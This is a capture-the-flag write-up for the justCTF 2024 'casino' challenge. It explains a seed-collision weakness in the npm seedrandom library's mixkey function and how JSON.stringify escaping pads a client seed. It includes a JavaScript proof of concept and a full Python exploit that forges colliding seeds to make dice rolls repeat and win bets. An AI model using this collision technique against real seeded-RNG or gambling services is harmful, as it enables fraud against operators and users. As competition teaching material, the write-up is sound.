Author: 0x6fe1be2

Version 19-06-24

# [justCTF 2024 teaser](https://ctftime.org/event/2342) (15.06-16.06)

## casino
Category: MISC, WEB

Points: 394 (7 Solves)

Teammates: lavish, kdm, profiluefter

> Although the odds of winning are rigged, this casino is 100% fair! Can you win against the house?
> + http://casino.web.jctf.pro
>  + https://s3.cdn.justctf.team/95d9162d-abfc-4aac-8aed-b30a4d90c773/casino_docker.tar.gz  

### TL;DR

the npm package `seedrandom` has a collision vulnerability in `mixkey(seed, key)`, that can be abused to generate collisions in the generated seeds. This is exploited to create reoccuring rolls

### Overview

The challenge is a simple node js application that allows us to register for an account an play dice against the server.

```
.
├── Dockerfile
├── app.js
├── casino_docker.tar.gz
├── docker-compose.yaml
├── package.json
└── static
    ├── home.html
    ├── index.html
    ├── js
    │   ├── dice.js
    │   ├── main.js
    │   └── provablyFair.js
    ├── login.html
    └── provably-fair.html
```

We start with a balance of 1000 and need to aquire:

![one billion dollars](https://external-preview.redd.it/zoHY8xZQBX1jP5x8ZokujiQTh9VfhJHfgjMf1gFBalM.jpg?auto=webp&s=5651d4db504fe41ae3344e3d8fcdf563a8c6057e)

this is infeasible by pure luck so lets look at the code (or scroll through the website `/provably-fair.html`):

```js
app.post("/bet", (req, res) => {
    ...
    
    if (typeof clientSeed != "string" || clientSeed.length != 64) {
        res.json({ "error": "Invalid client seed!" })
        return
    }
    
    ...

    let roll = (seedrandom(JSON.stringify({
        serverSeed: req.user.serverSeed,
        clientSeed,
        nonce: req.user.nonce++
    })).int32() >>> 0) % 6 + 1

    ...
});

```

this uses the values`req.user.serverSeed`, `clientSeed` and `req.user.nonce` to generate a object that is turned into string using`JSON.stringify` for each bet. Notable observation are:  

+ serverSeed is securely randomly generated (and not changed) and 64 bytes long
+ clientSeed is provided for the user for each bet and 64 bytes long
+ nonce starts at 0 and get's incremented for each bet


We can also see that the `seedrandom` package ([npmjs](https://www.npmjs.com/package/seedrandom)) is used to generate the random value and role. 

Looking through the source code and the closed issues we find some interesting stuff, notably: [ Strings consisting of a repeated pattern cause collisions #63 ](https://github.com/davidbau/seedrandom/issues/63) and even though this isn't the intended vulnerability it's a good indecator that the library might have more issues.


### Vulnerability

Let's look at the source code of seedrandom, and we quickly find this function:

[seedrandom.js](https://github.com/davidbau/seedrandom/blob/released/seedrandom.js#L179)

```js
...
function mixkey(seed, key) {
  var stringseed = seed + '', smear, j = 0;
  while (j < stringseed.length) {
    key[mask & j] =
      mask & ((smear ^= key[mask & j] * 19) + stringseed.charCodeAt(j++));
  }
  return tostring(key);
}
...
```

This is called using an empty list for `key` and the `seed` supplied from directly calling seedrandom. The mask value is `0xff` so basically a one byte mask. The code seems very basic and is not really trying to prevent any collision, but because it's kind of a big one liner it might not be easy to understand, so let's simplify it:

```js
...
function mixkey(seed, key) {
  var stringseed = seed + '';
  var smear = 0;
  var j = 0;
  while (j < 0x100 &&j < stringseed.length) {
	\\ smear is always 0 for first round
    key[mask & j] = mask & stringseed.charCodeAt(j);
    j++;
  }
  while (j < stringseed.length) {
  	smear ^= key[mask & j] * 19;
    key[mask & j] = mask & (smear + stringseed.charCodeAt(j));
    j++;
  }
  return tostring(key); \\ create 255 length string from byte array
}
...
```

as we can see the seed wraps arround after 0x100 characters and 'insecurly' combines the values, especially if we consider that `stringseed.charCodeAt(j)` can return values larger than 0x100.

so let's try to create collisions:

### PoC

this is a simple PoC code that creates collisions using our prefix (in this case we can just use any serverSeed) and a predictable suffix.

```js
const seedrandom = require('seedrandom')
mask = 0xff
prefix = '{"serverSeed":"24fc5b5e3a5bd0aa85b1cc9c116eef52feeed884676173bfd1d725741b213d33","clientSeed":"'
rands = crypto.randomBytes(0x100/2).toString("hex")
suffix1='","nonce":0}'
suffix2='","nonce":1}'
ssize = suffix1.length

a = prefix + rands + suffix1

let smear = 0

for(let i = 0; i < a.length-0x100-ssize; i++) 
  smear ^= (a.charCodeAt(i)*19) & 0xff

let inject = ''  
let csmear = smear

for(let i = a.length-ssize; i < a.length; i++){
  let j = 0
  smear ^= (a.charCodeAt(i-0x100)*19) & 0xff
  for(; j < 0x100; ++j){
    if(((a.charCodeAt(i)+smear)&0xff) == ((suffix2.charCodeAt(i-a.length+ssize)+(csmear^(j*19)))&0xff)) {
      break;
    }
  }
  
  if(j == 0x100)
    console.log('no solution')

  inject += String.fromCharCode(j)
  csmear ^= (j * 19) & 0xff
}

b = prefix + inject + rands.substring(inject.length) + suffix2

console.log(seedrandom(a).int32())
console.log(seedrandom(b).int32())

```

so now that we can create a collision there is only one remaining problem, for a wrap arround we need at least 0x100 (256) bytes and in order to align the predictable suffix with our user controlled value we need our user controlled value to be about 0x100 by itself, but it's limited to 64, so how do we do this?

### json.dumps vs JSON.stringify

JSON stringify actually escapes certain string, notably these:

```js
>> JSON.stringify('\0') \\ length 6
'"\\u0000"' 

>> JSON.stringify('') \\ length 2
'""' 
```

which we can use to increase the size of our client_seed to (and above) the desired length of 0x100.

Sadly i ran into an issue here, I wrote my exploit in python and hoped that `json.dumps` creates the same strings as `JSON.stringify`, which is not the case, and can easily be tested like this:

```js
for(let i = 0; i < 0x1000; i++)
  if(JSON.stringify(String.fromCharCode(i)).length != 3)
    console.log(i)
```

and for python

```python
import json
for i in range(0x100):
	if json.dumps(chr(i)) != 3:
		print(i)
```

notably all charcters after 0x7f are unicode escaped to 6 bytes in python, which is not the case for js.

so we just create a comparable list ourselves using this:

```python
printables = list(filter(lambda x: chr(x) not in ('"', '\\'), range(32, 0x1001)))
```

We can now combine all our techniques to write an exploit and get the flag.

### Exploit

Flag: `justCTF{n0_w4y__h0w_1ucky_4re_y0u??}`

<details>

```python
#!/usr/bin/env python3

import requests
import random
import string
import json
import subprocess


URL = 'http://casino.web.jctf.pro'
# URL = 'http://localhost:3030'

def gen_random(length: int, alphabet: str = string.ascii_lowercase) -> str:
  return ''.join(random.choices(alphabet, k=length))

def reg_user(session, username: str, password: str):
  data = {
    'username': username,
    'password': password
  }
  r = session.post(f'{URL}/register', data=data)
  
  assert r.status_code == 200


def get_info(session):
  return session.get(f'{URL}/info').json()


def bet(session, amount: int, guess: int, client_seed: str):
  data = {
    'bet': amount,
    'guess': guess,
    'clientSeed': client_seed
  }
  r = session.post(f'{URL}/bet', data=data)
  
  assert r.status_code == 200
  return r.json()

def mixkey(seed, key):
  mask = 0xff
  stringseed = seed + ''
  smear = 0
  j = 0
  while j < len(stringseed):
    smear ^= key[mask & j] * 19
    key[mask & j] = mask & (smear + ord(stringseed[j]));
    j += 1
  return ''.join(chr(x) for x in key);

printables = list(filter(lambda x: chr(x) not in ('"', '\\'), range(32, 0x1001)))

rands = list(gen_random(64))

i = 0
while (rsz := len(json.dumps(''.join(rands)))) != 0x102:
  if rsz < 0x102:
    i -= 1
    rands[i] = '\0'
  else:
    rands[i] = '"'

rands = ''.join(rands)
rands_stringify = json.dumps(rands)[1:-1]

def gen(n1=0, cnt=9, prefix='{"serverSeed":"24fc5b5e3a5bd0aa85b1cc9c116eef52feeed884676173bfd1d725741b213d33","clientSeed":"'):

  suffix1='","nonce":%d}' % n1
  outs = [rands]

  for i in range(1, cnt+1):
    suffix2 = '","nonce":%d}' % (n1 + i)
    assert len(suffix1) == len(suffix2)
    ssize = len(suffix1)

    a = prefix + rands_stringify + suffix1

    smear = 0

    for i in range(len(a)-0x100-ssize):
      smear ^= (ord(a[i])*19) & 0xff

    inject = ''  
    csmear = smear

    for i in range(len(a)-ssize, len(a)):
      j = 0
      char = -1
      smear ^= (ord(a[i-0x100])*19) & 0xff
      for j in printables:
        if(((ord(a[i])+smear)&0xff) == ((ord(suffix2[i-len(a)+ssize])+(csmear^(j*19)))&0xff)):
          char = j
          break;
      
      if(char == -1):
        print('no solution')
        exit(1)

      inject += chr(char)
      csmear ^= (j * 19) & 0xff

    clash = inject + rands[len(inject):]
    
    b = prefix + json.dumps(clash)[1:-1] + suffix2

    # print(a)
    # print(b)

    outs.append(clash)

  return outs

while True:
  username = gen_random(10)
  password = gen_random(12, alphabet=string.ascii_letters + string.digits)

  session = requests.Session()
  reg_user(session, username, password)

  guess = -1
  for s in gen(0):
    bet_data = bet(session, 100, guess if guess != -1 else 1, s)
    print(bet_data, end='\n')

    if guess == -1:
      guess = bet_data['roll']

  if bet_data['balance'] <= 1700:
    continue

  for i in range(10, 1000000, 10):
    guess = -1 
    for s in gen(i):
      bet_size = bet_data['balance'] // 4 if guess != -1 else 1
      bet_data = bet(session, bet_size, guess if guess != -1 else 1, s)
      print(bet_data, end='\n')

      if bet_data['balance'] < 1000:
        break 

      if guess == -1:
        guess = bet_data['roll']

      if bet_data['balance'] >= 1e9:
        r = session.get(f'{URL}/flag')
        print(r.text)
        exit(0)

    if bet_data['balance'] < 1000:
      break 

```

</details>
